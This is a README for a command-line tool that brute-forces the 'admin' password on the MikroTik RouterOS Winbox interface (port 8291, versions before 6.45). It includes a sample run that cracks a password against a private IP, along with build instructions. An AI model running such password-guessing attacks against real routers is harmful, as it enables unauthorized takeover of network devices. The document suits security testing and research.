# Winbox Bruteforce

The Winbox interface, port 8291, has... let's say absolutely no bruteforce protection if you can reach it. There is a feature that limits which IPs can connect to it, but if you are in that IP range or it isn't set then you can brute force it to your hearts content.

This project takes a list of passwords, and IP address, and a port. It will keep sending login requests for the 'admin' user until its out of passwords to try or it found a valid request.

Sample:

```
albinolobster@ubuntu:~/routeros_internal/brute_force/winbox_brute/build$ time ./winbox_bruteforce -f ~/top10000.txt -i 192.168.1.23 -p 8291 2> /dev/null
[+] Loading password file...
[+] Found 10000 passwords.
10000 / 10000
We found the password! Use admin:lolwat

real    0m39.205s
user    0m1.041s
sys     0m5.797s
```

## What versions does this work on?

Any RouterOS version less than 6.45. 6.45 changed a lot of login stuff (probably still bruteforceable but I don't know how login works at the moment).

## Are there side affects?

Oh yeah. All log in attempts are written to the log file... it gets long pretty quick.

## What are the build dependencies?

This requires:

* Boost 1.66 or higher
* cmake

## How do I build this jawn?

Just normal cmake. Try this:

```sh
mkdir build
cd build
cmake ..
make
```

Resolve dependencies as needed.